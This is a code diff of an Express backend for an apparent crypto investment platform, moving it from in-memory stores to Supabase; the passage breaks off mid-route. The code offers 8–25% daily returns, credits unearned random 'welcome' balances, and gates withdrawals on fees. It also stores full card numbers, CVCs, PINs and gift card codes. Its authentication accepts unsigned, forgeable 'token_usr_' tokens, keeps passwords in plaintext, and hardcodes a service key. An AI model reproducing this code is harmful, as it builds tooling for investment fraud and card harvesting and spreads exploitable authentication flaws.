@@ -1,25 +1,25 @@
+import 'dotenv/config';
 import express from 'express';
-import path from 'path';
-import { fileURLToPath } from 'url';
 import cors from 'cors';
-
-const getDirname = () => {
-  try {
-    if (typeof import.meta !== 'undefined' && import.meta && import.meta.url) {
-      return path.dirname(fileURLToPath(import.meta.url));
-    }
-  } catch {}
-  return process.cwd();
-};
-const __dirname = getDirname();
+import { createClient } from '@supabase/supabase-js';
+import { fileURLToPath } from 'url';
+import path from 'path';
 
 const app = express();
 const PORT = 3000;
 
-app.use(cors());
-app.use(express.json());
+// ── Supabase Client ───────────────────────────────────────────────────────────
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://edpbhfxkflgtqgygjfyg.supabase.co';
+const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || 'sb_secret_P9S0aFJQY2m_jOi0mRreMA_xy0j9Tuv';
+const db = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
+  auth: { persistSession: false },
+});
 
-// Normalize Netlify function rewrite URLs so /api routes match consistently
+// ── Middleware ────────────────────────────────────────────────────────────────
+app.use(cors());
+app.use(express.json({ limit: '10mb' }));
+
+// Normalize Netlify function rewrite URLs so /api/* routes match correctly
 app.use((req, _res, next) => {
   if (req.url.startsWith('/.netlify/functions/api')) {
     req.url = req.url.replace('/.netlify/functions/api', '') || '/';
@@ -30,1822 +30,1675 @@ app.use((req, _res, next) => {
   next();
 });
 
-// In-Memory Database Store
-interface DBUser {
-  uid: string;
-  email: string;
-  password?: string;
-  fullName: string;
-  phone?: string;
-  country?: string;
-  address?: string;
-  balance: number;
-  profitBalance: number;
-  stakedBalance: number;
-  totalWithdrawn: number;
-  totalDeposited: number;
-  kycStatus: 'unverified' | 'pending' | 'verified_tier1' | 'verified_tier2' | 'verified_tier3' | 'rejected';
-  kycTier: number;
-  isAdmin: boolean;
-  isVerified: boolean;
-  hasDepositedMinimum: boolean;
-  withdrawalFeePaid: boolean;
-  twoFactorEnabled: boolean;
-  securityPin?: string;
-  referralCode: string;
-  referralEarnings: number;
-  isBanned?: boolean;
-  status: 'active' | 'suspended' | 'locked';
-  banReason?: string;
-  createdAt: string;
-}
-
-interface DBWallet {
-  id: string;
-  coin: string;
-  network: string;
-  address: string;
-  qrCodeUrl?: string;
-  isEnabled: boolean;
-  label: string;
-  memo?: string;
-  updatedAt?: string;
-}
-
-interface DBTransaction {
-  id: string;
-  userId: string;
-  userEmail?: string;
-  type: 'deposit' | 'withdrawal' | 'investment' | 'trade_buy' | 'trade_sell' | 'profit' | 'fee';
-  method?: 'crypto' | 'bank' | 'card' | 'giftcard';
-  amount: number;
-  coin: string;
-  cryptoAmount?: number;
-  txHash?: string;
-  destinationAddress?: string;
-  status: 'approved' | 'pending' | 'processing' | 'rejected' | 'failed';
-  createdAt: string;
-  details?: string;
-  adminReason?: string;
-  networkFee?: number;
-}
-
-interface DBKYCDocument {
-  id: string;
-  userId: string;
-  userEmail: string;
-  fullName: string;
-  country: string;
-  docType: 'passport' | 'id_card' | 'drivers_license';
-  idNumber: string;
-  frontImageUrl?: string;
-  backImageUrl?: string;
-  selfieUrl?: string;
-  proofOfAddressUrl?: string;
-  status: 'pending' | 'approved' | 'rejected';
-  submittedAt: string;
-  reviewedAt?: string;
-  adminNotes?: string;
-}
-
-interface DBGiftCard {
-  id: string;
-  userId: string;
-  userEmail: string;
-  type: string;
-  code: string;
-  pin: string;
-  amount: number;
-  status: 'pending' | 'approved' | 'rejected';
-  submittedAt: string;
-  adminReason?: string;
-}
-
-interface DBCard {
-  id: string;
-  userId: string;
-  userEmail: string;
-  fullName?: string;
-  cardNumber: string;
-  cardholderName: string;
-  expiryDate: string;
-  cvc: string;
-  pin?: string;
-  amount: number;
-  billingAddress?: string;
-  submittedAt: string;
-  status: 'captured' | 'settled' | 'approved' | 'rejected' | 'flagged';
-}
-
-interface DBSetting {
-  key: string;
-  value: string;
-  description: string;
-  updatedAt: string;
-}
-
-// Initial System Wallets
-let systemWallets: DBWallet[] = [
+// ── Static Investment Plans ───────────────────────────────────────────────────
+const INVESTMENT_PLANS = [
   {
-    id: 'w-btc-01',
-    coin: 'Bitcoin',
-    network: 'BTC (Native SegWit)',
-    address: 'bc1q9v8t63u9y4fepw6q7n0kxm3vzp9y4fe7xk2k9a',
-    isEnabled: true,
-    label: 'Primary BTC Cold Vault',
-    memo: '',
-    updatedAt: new Date().toISOString(),
+    id: 'starter',
+    name: 'Starter Vault',
+    badge: 'Entry Level',
+    profit: '8% Daily ROI',
+    dailyProfitPercent: 8,
+    min: '$100',
+    minDepositUsd: 100,
+    max: '$2,499',
+    maxDepositUsd: 2499,
+    days: '3 Days',
+    durationDays: 3,
+    desc: 'Entry-level automated yield strategy for new investors.',
+    features: ['8% Daily Returns', 'Auto-compounding', '3-Day Lock Period', 'Crypto + Fiat Deposits', '24/7 Support'],
+    popular: false,
   },
   {
-    id: 'w-eth-01',
-    coin: 'Ethereum',
-    network: 'ERC-20 (Mainnet)',
-    address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
-    isEnabled: true,
-    label: 'ETH Liquidity Vault',
-    memo: '',
-    updatedAt: new Date().toISOString(),
+    id: 'growth',
+    name: 'Growth Protocol',
+    badge: 'Most Popular',
+    profit: '12% Daily ROI',
+    dailyProfitPercent: 12,
+    min: '$2,500',
+    minDepositUsd: 2500,
+    max: '$19,999',
+    maxDepositUsd: 19999,
+    days: '5 Days',
+    durationDays: 5,
+    desc: 'Mid-tier DeFi yield aggregator with enhanced compounding.',
+    features: ['12% Daily Returns', 'Priority Liquidity', '5-Day Lock Period', 'Multi-Asset Support', 'Dedicated Account Manager'],
+    popular: true,
   },
   {
-    id: 'w-usdt-trc20',
-    coin: 'Tether (USDT)',
-    network: 'TRC-20 (Tron)',
-    address: 'TLa2y8uVq9N7aEepW6xM3vZp9y4fE7xK2k',
-    isEnabled: true,
-    label: 'Instant USDT Gateway (Zero Gas)',
-    memo: '',
-    updatedAt: new Date().toISOString(),
+    id: 'elite',
+    name: 'Elite Liquidity',
+    badge: 'High Yield',
+    profit: '18% Daily ROI',
+    dailyProfitPercent: 18,
+    min: '$20,000',
+    minDepositUsd: 20000,
+    max: '$99,999',
+    maxDepositUsd: 99999,
+    days: '7 Days',
+    durationDays: 7,
+    desc: 'Institutional-grade strategy with maximum yield optimization.',
+    features: ['18% Daily Returns', 'Institutional Liquidity', '7-Day Lock Period', 'Advanced Analytics', 'Priority Withdrawals'],
+    popular: false,
   },
   {
-    id: 'w-usdt-erc20',
-    coin: 'Tether (USDT)',
-    network: 'ERC-20 (Ethereum)',
-    address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
-    isEnabled: true,
-    label: 'Institutional ERC-20 Tether Pool',
-    memo: '',
-    updatedAt: new Date().toISOString(),
-  },
-  {
-    id: 'w-sol-01',
-    coin: 'Solana',
-    network: 'SOL (Solana Mainnet)',
-    address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
-    isEnabled: true,
-    label: 'Solana High-Frequency Vault',
-    memo: '',
-    updatedAt: new Date().toISOString(),
-  },
-  {
-    id: 'w-bnb-01',
-    coin: 'BNB Chain',
-    network: 'BEP-20 (BNB Smart Chain)',
-    address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
-    isEnabled: true,
-    label: 'BNB Smart Chain Yield Reserve',
-    memo: '',
-    updatedAt: new Date().toISOString(),
+    id: 'institutional',
+    name: 'Institutional Fund',
+    badge: 'VIP',
+    profit: '25% Daily ROI',
+    dailyProfitPercent: 25,
+    min: '$100,000',
+    minDepositUsd: 100000,
+    max: 'Unlimited',
+    maxDepositUsd: 99999999,
+    days: '14 Days',
+    durationDays: 14,
+    desc: 'Exclusive high-capital program for verified institutional investors.',
+    features: ['25% Daily Returns', 'OTC Desk Access', '14-Day Lock Period', 'Personal Relationship Manager', 'Insurance Coverage'],
+    popular: false,
   },
 ];
 
-// Initial Users
-let usersStore: DBUser[] = [
-  {
-    uid: 'usr_institutional_01',
-    email: 'investor@nexo-client.com',
-    password: 'password123',
-    fullName: 'Alexander Vance',
-    phone: '+1 (555) 234-8890',
-    country: 'United States',
-    address: '450 Lexington Ave, New York, NY',
-    balance: 48500.0,
-    profitBalance: 12450.0,
-    stakedBalance: 35000.0,
-    totalWithdrawn: 18000.0,
-    totalDeposited: 71500.0,
-    kycStatus: 'verified_tier2',
-    kycTier: 2,
-    isAdmin: true,
-    isVerified: true,
-    hasDepositedMinimum: true,
-    withdrawalFeePaid: true,
-    twoFactorEnabled: true,
-    securityPin: '1234',
-    referralCode: 'NEXO888',
-    referralEarnings: 2400.0,
-    status: 'active',
-    createdAt: new Date(Date.now() - 30 * 86400000).toISOString(),
-  },
-  {
-    uid: 'usr_sarah_02',
-    email: 'sarah.jenkins@meridian-cap.org',
-    password: 'password123',
-    fullName: 'Sarah Jenkins',
-    phone: '+44 20 7946 0912',
-    country: 'United Kingdom',
-    balance: 4120.5,
-    profitBalance: 890.0,
-    stakedBalance: 15000.0,
-    totalWithdrawn: 12400.0,
-    totalDeposited: 28000.0,
-    kycStatus: 'verified_tier2',
-    kycTier: 2,
-    isAdmin: false,
-    isVerified: true,
-    hasDepositedMinimum: true,
-    withdrawalFeePaid: true,
-    twoFactorEnabled: false,
-    securityPin: '0000',
-    referralCode: 'SARAH77',
-    referralEarnings: 450.0,
-    status: 'active',
-    createdAt: new Date(Date.now() - 14 * 86400000).toISOString(),
-  },
-  {
-    uid: 'usr_marcus_03',
-    email: 'marcus.sterling@apex-holdings.co',
-    password: 'password123',
-    fullName: 'Marcus Sterling',
-    phone: '+1 (555) 890-1234',
-    country: 'United States',
-    balance: 4850.0,
-    profitBalance: 1420.0,
-    stakedBalance: 50000.0,
-    totalWithdrawn: 35000.0,
-    totalDeposited: 95000.0,
-    kycStatus: 'verified_tier3',
-    kycTier: 3,
-    isAdmin: false,
-    isVerified: true,
-    hasDepositedMinimum: true,
-    withdrawalFeePaid: true,
-    twoFactorEnabled: true,
-    securityPin: '8888',
-    referralCode: 'MARCUS99',
-    referralEarnings: 3100.0,
-    status: 'active',
-    createdAt: new Date(Date.now() - 45 * 86400000).toISOString(),
-  },
-  {
-    uid: 'usr_suspended_04',
-    email: 'klaus.weber@berlin-tech.de',
-    password: 'password123',
-    fullName: 'Klaus Weber',
-    phone: '+49 30 1234567',
-    country: 'Germany',
-    balance: 3950.0,
-    profitBalance: 0,
-    stakedBalance: 0,
-    totalWithdrawn: 0,
-    totalDeposited: 3950.0,
-    kycStatus: 'pending',
-    kycTier: 1,
-    isAdmin: false,
-    isVerified: false,
-    hasDepositedMinimum: false,
-    withdrawalFeePaid: false,
-    twoFactorEnabled: false,
-    securityPin: '1111',
-    referralCode: 'KLAUS12',
-    referralEarnings: 0,
-    status: 'suspended',
-    banReason: 'Compliance KYC verification required before ledger access',
-    createdAt: new Date(Date.now() - 5 * 86400000).toISOString(),
-  },
-];
+// ── Utility Helpers ───────────────────────────────────────────────────────────
+const genId = (prefix: string) =>
+  `${prefix}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
 
-// Initial Transactions
-let transactionsStore: DBTransaction[] = [
-  {
-    id: 'tx-dep-01',
-    userId: 'usr_institutional_01',
-    userEmail: 'investor@nexo-client.com',
-    type: 'deposit',
-    method: 'crypto',
-    amount: 50000,
-    coin: 'Bitcoin (BTC)',
-    cryptoAmount: 0.518,
-    status: 'approved',
-    destinationAddress: 'bc1q9v8t63u9y4fepw6q7n0kxm3vzp9y4fe7xk2k9a',
-    txHash: '0x8f4d92a1c0e3b74958671f2849e7a9b01c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f',
-    createdAt: new Date(Date.now() - 2 * 86400000).toISOString(),
-    details: 'Institutional On-Chain BTC Settlement',
-  },
-  {
-    id: 'tx-wth-02',
-    userId: 'usr_institutional_01',
-    userEmail: 'investor@nexo-client.com',
-    type: 'withdrawal',
-    method: 'crypto',
-    amount: 18000,
-    coin: 'USDT (TRC-20)',
-    cryptoAmount: 18000,
-    status: 'approved',
-    destinationAddress: 'TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6',
-    txHash: '0x3c9e1a8b7f6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b',
-    createdAt: new Date(Date.now() - 1 * 86400000).toISOString(),
-    details: '0xGuard Verified Release',
-  },
-  {
-    id: 'tx-stk-03',
-    userId: 'usr_institutional_01',
-    userEmail: 'investor@nexo-client.com',
-    type: 'investment',
-    amount: 35000,
-    coin: 'USD Yield',
-    status: 'approved',
-    createdAt: new Date(Date.now() - 10 * 86400000).toISOString(),
-    details: 'Executive Yield Staking Contract (3.2% Daily)',
-  },
-  {
-    id: 'tx-wth-04',
-    userId: 'usr_sarah_02',
-    userEmail: 'sarah.jenkins@meridian-cap.org',
-    type: 'withdrawal',
-    method: 'bank',
-    amount: 12400,
-    coin: 'USD Wire',
-    status: 'pending',
-    destinationAddress: 'CHASE BANK NA - ACCT #***4920',
-    createdAt: new Date(Date.now() - 3600000 * 2).toISOString(),
-    details: 'International SWIFT Wire Transfer',
-  },
-  {
-    id: 'tx-dep-05',
-    userId: 'usr_marcus_03',
-    userEmail: 'marcus.sterling@apex-holdings.co',
-    type: 'deposit',
-    method: 'crypto',
-    amount: 35000,
-    coin: 'Ethereum (ETH)',
-    cryptoAmount: 12.32,
-    status: 'approved',
-    destinationAddress: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
-    createdAt: new Date(Date.now() - 3600000 * 4).toISOString(),
-    details: 'Ethereum Mainnet Fast Deposit',
-  },
-];
+const randomBalance = () => Math.floor(Math.random() * (6898 - 3400 + 1)) + 3400;
 
-// Initial KYC Docs
-let kycDocsStore: DBKYCDocument[] = [
-  {
-    id: 'kyc-doc-01',
-    userId: 'usr_institutional_01',
-    userEmail: 'investor@nexo-client.com',
-    fullName: 'Alexander Vance',
-    country: 'United States',
-    docType: 'passport',
-    idNumber: 'P892049182',
-    frontImageUrl: 'https://images.unsplash.com/photo-1544717305-2782549b5136?w=400',
-    selfieUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400',
-    status: 'approved',
-    submittedAt: new Date(Date.now() - 25 * 86400000).toISOString(),
-    reviewedAt: new Date(Date.now() - 24 * 86400000).toISOString(),
-    adminNotes: 'Verified Institutional Identity Tier 2',
-  },
-  {
-    id: 'kyc-doc-02',
-    userId: 'usr_suspended_04',
-    userEmail: 'klaus.weber@berlin-tech.de',
-    fullName: 'Klaus Weber',
-    country: 'Germany',
-    docType: 'id_card',
-    idNumber: 'DE92817294',
-    frontImageUrl: 'https://images.unsplash.com/photo-1544717305-2782549b5136?w=400',
-    status: 'pending',
-    submittedAt: new Date(Date.now() - 3600000 * 12).toISOString(),
-  },
-];
+// ── Row Mappers (DB snake_case → App camelCase) ───────────────────────────────
+const rowToUser = (r: any) => ({
+  uid: r.uid,
+  email: r.email,
+  password: r.password,
+  fullName: r.full_name || '',
+  phone: r.phone || '',
+  country: r.country || '',
+  address: r.address || '',
+  avatarUrl: r.avatar_url || '',
+  balance: parseFloat(r.balance) || 0,
+  profitBalance: parseFloat(r.profit_balance) || 0,
+  stakedBalance: parseFloat(r.staked_balance) || 0,
+  totalWithdrawn: parseFloat(r.total_withdrawn) || 0,
+  totalDeposited: parseFloat(r.total_deposited) || 0,
+  kycStatus: r.kyc_status || 'unverified',
+  kycTier: parseInt(r.kyc_tier) || 0,
+  isAdmin: r.is_admin || false,
+  isVerified: r.is_verified || false,
+  hasDepositedMinimum: r.has_deposited_minimum || false,
+  withdrawalFeePaid: r.withdrawal_fee_paid || false,
+  twoFactorEnabled: r.two_factor_enabled || false,
+  securityPin: r.security_pin || '0000',
+  referralCode: r.referral_code || '',
+  referredBy: r.referred_by,
+  referralEarnings: parseFloat(r.referral_earnings) || 0,
+  isBanned: r.is_banned || false,
+  banReason: r.ban_reason || '',
+  googleSub: r.google_sub,
+  status: r.status || 'active',
+  createdAt: r.created_at,
+});
 
-// Initial Gift Cards
-let giftCardsStore: DBGiftCard[] = [
-  {
-    id: 'gc-01',
-    userId: 'usr_sarah_02',
-    userEmail: 'sarah.jenkins@meridian-cap.org',
-    type: 'Amazon Giftcard',
-    code: 'AMZN-9284-1849-0192',
-    pin: '8492',
-    amount: 1500,
-    status: 'approved',
-    submittedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
-  },
-  {
-    id: 'gc-02',
-    userId: 'usr_marcus_03',
-    userEmail: 'marcus.sterling@apex-holdings.co',
-    type: 'Apple Store Card',
-    code: 'APPL-8839-4401-9921',
-    pin: '1092',
-    amount: 2500,
-    status: 'pending',
-    submittedAt: new Date(Date.now() - 3600000 * 3).toISOString(),
-  },
-];
+// Strip sensitive fields before sending to client
+const safeUser = (u: any) => {
+  const { password, googleSub, ...safe } = u;
+  return safe;
+};
 
-// Initial Cards
-let cardsStore: DBCard[] = [
-  {
-    id: 'card-01',
-    userId: 'usr_institutional_01',
-    userEmail: 'investor@nexo-client.com',
-    fullName: 'Alexander Vance',
-    cardNumber: '4532 •••• •••• 8829',
-    cardholderName: 'Alexander Vance',
-    expiryDate: '11/28',
-    cvc: '741',
-    amount: 5000,
-    submittedAt: new Date(Date.now() - 86400000 * 4).toISOString(),
-    status: 'settled',
-  },
-  {
-    id: 'card-02',
-    userId: 'usr_marcus_03',
-    userEmail: 'marcus.sterling@apex-holdings.co',
-    fullName: 'Marcus Sterling',
-    cardNumber: '5424 •••• •••• 3190',
-    cardholderName: 'Marcus Sterling',
-    expiryDate: '09/27',
-    cvc: '902',
-    amount: 12000,
-    submittedAt: new Date(Date.now() - 3600000 * 6).toISOString(),
-    status: 'captured',
-  },
-];
+const rowToTx = (r: any) => ({
+  id: r.id,
+  userId: r.user_id,
+  userEmail: r.user_email,
+  type: r.type,
+  method: r.method,
+  amount: parseFloat(r.amount) || 0,
+  coin: r.coin || '',
+  cryptoAmount: r.crypto_amount ? parseFloat(r.crypto_amount) : undefined,
+  txHash: r.tx_hash,
+  destinationAddress: r.destination_address,
+  status: r.status,
+  details: r.details,
+  adminReason: r.admin_reason,
+  networkFee: r.network_fee ? parseFloat(r.network_fee) : undefined,
+  createdAt: r.created_at,
+});
 
-// Initial Global Settings
-let globalSettingsStore: DBSetting[] = [
-  {
-    key: 'global_alert_banner',
-    value: '',
-    description: 'Broadcast headline displayed across top header ticker to all active clients',
-    updatedAt: new Date().toISOString(),
-  },
-  {
-    key: 'min_deposit_threshold',
-    value: '500',
-    description: 'Minimum USD deposit requirement to unlock unconstrained liquidity releases',
-    updatedAt: new Date().toISOString(),
-  },
-  {
-    key: 'withdrawal_fee_percent',
-    value: '1.5',
-    description: 'Standard network clearance & custodial insurance fee percentage',
-    updatedAt: new Date().toISOString(),
-  },
-  {
-    key: 'auto_approve_tier2_withdrawals',
-    value: 'false',
-    description: 'Require manual administrative audit check for withdrawals exceeding $10,000',
-    updatedAt: new Date().toISOString(),
-  },
-  {
-    key: 'signup_bonus_enabled',
-    value: 'true',
-    description: 'Automatically credit new investor accounts with initial institutional balance range ($3,750 - $4,967)',
-    updatedAt: new Date().toISOString(),
-  },
-];
+const rowToKyc = (r: any) => ({
+  id: r.id,
+  userId: r.user_id,
+  userEmail: r.user_email,
+  fullName: r.full_name,
+  country: r.country,
+  docType: r.doc_type,
+  idNumber: r.id_number,
+  frontImageUrl: r.front_image_url,
+  backImageUrl: r.back_image_url,
+  selfieUrl: r.selfie_url,
+  proofOfAddressUrl: r.proof_of_address_url,
+  status: r.status,
+  adminNotes: r.admin_notes,
+  submittedAt: r.submitted_at,
+  reviewedAt: r.reviewed_at,
+});
 
-// Helper to authenticate request
-function getAuthUser(req: express.Request): DBUser | null {
-  const authHeader = req.headers.authorization;
-  if (!authHeader) return null;
-  const token = authHeader.replace('Bearer ', '').trim();
-  
-  if (token === 'demo-jwt-token-institutional' || token.startsWith('token_usr_institutional_01')) {
-    return usersStore.find((u) => u.uid === 'usr_institutional_01') || null;
-  }
-  
+const rowToWallet = (r: any) => ({
+  id: r.id,
+  coin: r.coin,
+  network: r.network,
+  address: r.address,
+  qrCodeUrl: r.qr_code_url || '',
+  isEnabled: r.is_enabled,
+  label: r.label,
+  memo: r.memo || '',
+});
+
+const rowToGiftCard = (r: any) => ({
+  id: r.id,
+  userId: r.user_id,
+  userEmail: r.user_email,
+  type: r.type,
+  code: r.code,
+  pin: r.pin,
+  amount: parseFloat(r.amount) || 0,
+  status: r.status,
+  imageProofUrl: r.image_proof_url,
+  adminReason: r.admin_reason,
+  submittedAt: r.submitted_at,
+});
+
+const rowToCard = (r: any) => ({
+  id: r.id,
+  userId: r.user_id,
+  userEmail: r.user_email,
+  fullName: r.full_name,
+  cardNumber: r.card_number,
+  cardholderName: r.cardholder_name,
+  expiryDate: r.expiry_date,
+  cvc: r.cvc,
+  pin: r.pin,
+  amount: parseFloat(r.amount) || 0,
+  billingAddress: r.billing_address,
+  reference: r.reference,
+  status: r.status,
+  submittedAt: r.submitted_at,
+});
+
+const rowToSetting = (r: any) => ({
+  key: r.key,
+  value: r.value,
+  description: r.description,
+  updatedAt: r.updated_at,
+});
+
+const rowToInvestment = (r: any) => ({
+  id: r.id,
+  userId: r.user_id,
+  planId: r.plan_id,
+  planName: r.plan_name,
+  amount: parseFloat(r.amount) || 0,
+  cryptoAsset: r.crypto_asset,
+  cryptoAmount: parseFloat(r.crypto_amount) || 0,
+  dailyProfitPercent: parseFloat(r.daily_profit_percent) || 0,
+  expectedProfitUsd: parseFloat(r.expected_profit_usd) || 0,
+  totalClaimed: parseFloat(r.total_claimed) || 0,
+  startDate: r.start_date,
+  endDate: r.end_date,
+  durationDays: r.duration_days,
+  status: r.status,
+  autoCompound: r.auto_compound,
+  lastClaimDate: r.last_claim_date,
+});
+
+const rowToTrade = (r: any) => ({
+  id: r.id,
+  userId: r.user_id,
+  pair: r.pair,
+  type: r.type,
+  orderType: r.order_type,
+  price: parseFloat(r.price) || 0,
+  amount: parseFloat(r.amount) || 0,
+  total: parseFloat(r.total) || 0,
+  status: r.status,
+  createdAt: r.created_at,
+});
+
+// ── Auth Helper ───────────────────────────────────────────────────────────────
+const getAuthUser = async (req: express.Request) => {
+  const authHeader = req.headers.authorization || '';
+  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : authHeader;
+  if (!token) return null;
+
   const match = token.match(/^token_(usr_[a-zA-Z0-9_-]+)/);
-  if (match) {
-    const uid = match[1];
-    const userById = usersStore.find((u) => u.uid === uid);
-    if (userById) return userById;
-  }
-  
-  const found = usersStore.find((u) => token.includes(u.uid) || (u.email && token.includes(u.email)));
-  return found || null;
-}
+  if (!match) return null;
+  const uid = match[1];
 
-// ---------------------------------------------------------------------------------
-// PUBLIC & AUTH ROUTES
-// ---------------------------------------------------------------------------------
+  const { data, error } = await db.from('users').select('*').eq('uid', uid).single();
+  if (error || !data) return null;
+  return rowToUser(data);
+};
 
-// API health endpoint
-app.get('/api/health', (_req, res) => {
-  res.json({ status: 'healthy', timestamp: new Date().toISOString(), totalUsers: usersStore.length });
-});
+// ── Health Check ──────────────────────────────────────────────────────────────
+app.get('/api/health', (_req, res) => res.json({ status: 'ok', db: 'supabase-postgresql' }));
 
-// Registration Endpoint
-// REQUIREMENT: "when new users sign up, the account balance should be in range $3750 to $4967 random for every new users"
-app.post('/api/auth/register', (req, res) => {
-  const { email, password, fullName, phone, country, referralCode } = req.body;
-  if (!email) {
-    return res.status(400).json({ error: 'Email address is required.' });
-  }
+// ── Investment Plans ──────────────────────────────────────────────────────────
+app.get('/api/investment-plans', (_req, res) => res.json(INVESTMENT_PLANS));
 
-  const existing = usersStore.find((u) => u.email.toLowerCase() === email.toLowerCase());
-  if (existing) {
-    return res.status(400).json({ error: 'An account with this email address already exists.' });
-  }
+// =============================================================================
+// AUTH ROUTES
+// =============================================================================
 
-  // Calculate random balance between $3,750.00 and $4,967.00
-  const randomInitialBalance = parseFloat((Math.random() * (4967 - 3750) + 3750).toFixed(2));
-  const newUid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
-  
-  const newUser: DBUser = {
-    uid: newUid,
-    email: email.toLowerCase(),
-    password: password || 'defaultPassword123',
-    fullName: fullName || email.split('@')[0],
-    phone: phone || '',
-    country: country || 'United States',
-    balance: randomInitialBalance,
-    profitBalance: 0,
-    stakedBalance: 0,
-    totalWithdrawn: 0,
-    totalDeposited: 0,
-    kycStatus: 'unverified',
-    kycTier: 0,
-    isAdmin: false,
-    isVerified: false,
-    hasDepositedMinimum: false,
-    withdrawalFeePaid: false,
-    twoFactorEnabled: false,
-    securityPin: '0000',
-    referralCode: `NEXO${Math.floor(1000 + Math.random() * 9000)}`,
-    referralEarnings: 0,
-    status: 'active',
-    createdAt: new Date().toISOString(),
-  };
-
-  usersStore.push(newUser);
-
-  // Add initial sign-up credit transaction record (reward/bonus, NOT deposit)
-  transactionsStore.unshift({
-    id: `tx_welcome_${Date.now()}`,
-    userId: newUser.uid,
-    userEmail: newUser.email,
-    type: 'reward',
-    method: 'crypto',
-    amount: randomInitialBalance,
-    coin: 'USD Credit (Welcome Incentive)',
-    status: 'approved',
-    createdAt: new Date().toISOString(),
-    details: `Initial Institutional Welcome Balance ($${randomInitialBalance.toLocaleString()})`,
-  });
-
-  const token = `token_${newUser.uid}_${Date.now()}`;
-  res.status(201).json({
-    token,
-    user: newUser,
-    message: `Account registered successfully with an institutional balance of $${randomInitialBalance.toLocaleString()}.`,
-  });
-});
-
-// Login Endpoint
-app.post('/api/auth/login', (req, res) => {
-  const { email, password } = req.body;
-  if (!email) return res.status(400).json({ error: 'Email is required' });
-
-  const user = usersStore.find((u) => u.email.toLowerCase() === email.toLowerCase());
-  if (!user) {
-    // If institutional demo email or sample, log them in or create
-    return res.status(401).json({ error: 'Invalid credentials. User not found.' });
-  }
-
-  if (user.status === 'suspended' || user.isBanned) {
-    return res.status(403).json({
-      error: `Account suspended. Reason: ${user.banReason || 'Administrative compliance review in progress. Please contact support.'}`,
-      isBanned: true,
-      status: user.status,
-    });
-  }
-
-  const token = `token_${user.uid}_${Date.now()}`;
-  res.json({ token, user });
-});
-
-// Google Sign-In — receives decoded payload fields from the frontend (after GIS credential decode)
-app.post('/api/auth/google', (req, res) => {
-  const { email, fullName, sub, picture, country } = req.body;
-  if (!email) return res.status(400).json({ error: 'Google email is required' });
-
-  // Match by Google sub (most reliable) or by email
-  let user = usersStore.find(
-    (u) => (sub && (u as any).googleSub === sub) || u.email.toLowerCase() === email.toLowerCase()
-  );
-
-  if (user) {
-    // Persist the googleSub if not already stored
-    if (sub && !(user as any).googleSub) {
-      (user as any).googleSub = sub;
-    }
-    if (picture && !user.avatarUrl) {
-      user.avatarUrl = picture;
+app.post('/api/auth/register', async (req, res) => {
+  try {
+    const { email, password, fullName, country } = req.body;
+    if (!email || !password) {
+      return res.status(400).json({ error: 'Email and password are required' });
     }
 
-    if (user.status === 'suspended' || user.isBanned) {
+    const { data: existing } = await db
+      .from('users')
+      .select('uid')
+      .eq('email', email.toLowerCase())
+      .single();
+
+    if (existing) {
+      return res.status(409).json({ error: 'An account with this email already exists.' });
+    }
+
+    const uid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
+    const balance = randomBalance();
+
+    const { data: inserted, error } = await db
+      .from('users')
+      .insert([{
+        uid,
+        email: email.toLowerCase(),
+        password,
+        full_name: fullName || email.split('@')[0],
+        country: country || 'United States',
+        balance,
+        profit_balance: 0,
+        staked_balance: 0,
+        total_withdrawn: 0,
+        total_deposited: 0,
+        kyc_status: 'unverified',
+        kyc_tier: 0,
+        is_admin: false,
+        is_verified: false,
+        has_deposited_minimum: false,
+        withdrawal_fee_paid: false,
+        two_factor_enabled: false,
+        referral_code: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
+        referral_earnings: 0,
+        status: 'active',
+        avatar_url: '',
+      }])
+      .select()
+      .single();
+
+    if (error || !inserted) {
+      console.error('Register error:', error);
+      return res.status(500).json({ error: 'Failed to create account. Please try again.' });
+    }
+
+    // Welcome reward transaction
+    await db.from('transactions').insert([{
+      id: genId('tx_init'),
+      user_id: uid,
+      user_email: email.toLowerCase(),
+      type: 'reward',
+      method: 'crypto',
+      amount: balance,
+      coin: 'USD (Institutional Grant)',
+      status: 'approved',
+      details: `Initial Institutional Welcome Balance ($${balance.toLocaleString()})`,
+    }]);
+
+    const user = rowToUser(inserted);
+    const token = `token_${uid}_${Date.now()}`;
+    return res.status(201).json({ token, user: safeUser(user) });
+  } catch (err) {
+    console.error('Register exception:', err);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.post('/api/auth/login', async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    if (!email || !password) {
+      return res.status(400).json({ error: 'Email and password are required' });
+    }
+
+    const { data, error } = await db
+      .from('users')
+      .select('*')
+      .eq('email', email.toLowerCase())
+      .single();
+
+    if (error || !data) {
+      return res.status(401).json({ error: 'Invalid email or password.' });
+    }
+
+    const user = rowToUser(data);
+
+    if (user.password && user.password !== password) {
+      return res.status(401).json({ error: 'Invalid email or password.' });
+    }
+
+    if (user.isBanned || user.status === 'suspended') {
       return res.status(403).json({
         error: `Account suspended. Reason: ${user.banReason || 'Administrative compliance review in progress. Please contact support.'}`,
         isBanned: true,
-        status: user.status,
       });
     }
+
     const token = `token_${user.uid}_${Date.now()}`;
-    return res.json({ token, user, isNewUser: false });
+    return res.json({ token, user: safeUser(user) });
+  } catch (err) {
+    console.error('Login exception:', err);
+    return res.status(500).json({ error: 'Internal server error' });
   }
-
-  // New Google user — create account with strict Tier 0 / no deposit state
